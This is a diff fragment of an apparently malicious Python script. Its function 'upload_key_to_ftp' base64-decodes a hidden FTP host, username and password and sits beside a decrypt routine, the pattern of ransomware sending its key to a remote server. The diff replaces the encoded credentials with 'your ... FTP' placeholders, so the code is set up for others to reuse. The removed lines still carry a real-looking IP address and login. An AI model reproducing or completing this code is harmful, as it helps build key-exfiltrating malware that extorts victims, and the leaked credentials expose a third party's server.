@@ -79,17 +79,17 @@ def decrypt():
 
 # Uploading the key file to the FTP server
 def upload_key_to_ftp():
-    base64_host = "MTAwLjkwLjk1LjYK"
+    base64_host = "<your base64 encoded FTP hostname>"
     base64_bytes = base64_host.encode('ascii')
     host_bytes = base64.b64decode(base64_bytes)
     host = host_bytes.decode('ascii')
 
-    base64_username = "Y29uY2F0ZW5hdGUK"
+    base64_username = "<your base64 encoded FTP username>"
     base64_bytes = base64_username.encode('ascii')
     username_bytes = base64.b64decode(base64_bytes)
     username = username_bytes.decode('ascii')
 
-    base64_password = "YXJzaHNlcmkxMjMK"
+    base64_password = "<your base64 encoded FTP password>"
     base64_bytes = base64_password.encode('ascii')
     password_bytes = base64.b64decode(base64_bytes)
     password = password_bytes.decode('ascii')
